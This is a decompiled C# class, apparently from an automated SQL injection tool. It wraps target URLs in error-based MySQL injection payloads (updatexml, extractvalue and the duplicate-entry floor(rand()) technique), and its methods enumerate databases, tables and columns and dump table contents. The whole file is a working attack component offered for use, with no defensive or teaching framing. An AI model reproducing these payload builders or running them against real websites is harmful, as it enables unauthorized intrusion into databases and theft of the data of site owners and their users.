using System;
using System.Collections.Generic;

namespace DataBase
{
	// Token: 0x02000100 RID: 256
	public class MySQLWithError
	{
		// Token: 0x0600110E RID: 4366 RVA: 0x00075B7C File Offset: 0x00073D7C
		private static string smethod_0(string string_3, MySQLErrorType mySQLErrorType_0)
		{
			string result = "";
			switch (mySQLErrorType_0)
			{
			case MySQLErrorType.UpdateXML:
				result = string_3.Replace("[t]", "updatexml(rand(),(select [t]),0)");
				break;
			case MySQLErrorType.DuplicateEntry:
				result = string_3.Replace("[t]", "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)");
				break;
			case MySQLErrorType.ExtractValue:
				result = string_3.Replace("[t]", "extractvalue(rand(),(select [t]))");
				break;
			}
			return result;
		}

		// Token: 0x0600110F RID: 4367 RVA: 0x00075BE0 File Offset: 0x00073DE0
		public static string Info(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, List<string> lColumn, string sEndUrl = "")
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.Info(sTraject2, oCollaction, false, lColumn, sEndUrl);
		}

		// Token: 0x06001110 RID: 4368 RVA: 0x00075C04 File Offset: 0x00073E04
		public static string DataBases(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.DataBases(sTraject2, oCollaction, false, bCorrentDB, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		// Token: 0x06001111 RID: 4369 RVA: 0x00075C30 File Offset: 0x00073E30
		public static string Tables(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.Tables(sTraject2, oCollaction, sDataBase, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		// Token: 0x06001112 RID: 4370 RVA: 0x00075C5C File Offset: 0x00073E5C
		public static string Columns(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.Columns(sTraject2, oCollaction, sDataBase, sTable, bDataType, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		// Token: 0x06001113 RID: 4371 RVA: 0x00075C8C File Offset: 0x00073E8C
		public static string Dump(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sEndUrl = "", string sWhere = "", string sOrderBy = "", string sCustomQuery = "")
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.Dump(sTraject2, oCollaction, false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
		}

		// Token: 0x06001114 RID: 4372 RVA: 0x00075CC0 File Offset: 0x00073EC0
		public static string DumpNoKey(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sEndUrl = "", string sWhere = "", string sOrderBy = "", string sCustomQuery = "")
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.DumpNoKey(sTraject2, oCollaction, false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
		}

		// Token: 0x06001115 RID: 4373 RVA: 0x00075CF4 File Offset: 0x00073EF4
		public static string Count(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string sTraject2 = MySQLWithError.smethod_0(sTraject, oType);
			return MySQLNoError.Count(sTraject2, oCollaction, o, sDataBase, sTable, sWhere, sEndUrl);
		}

		// Token: 0x040008A0 RID: 2208
		private static string string_0;

		// Token: 0x040008A1 RID: 2209
		private static string string_1;

		// Token: 0x040008A2 RID: 2210
		private static string string_2;
	}
}
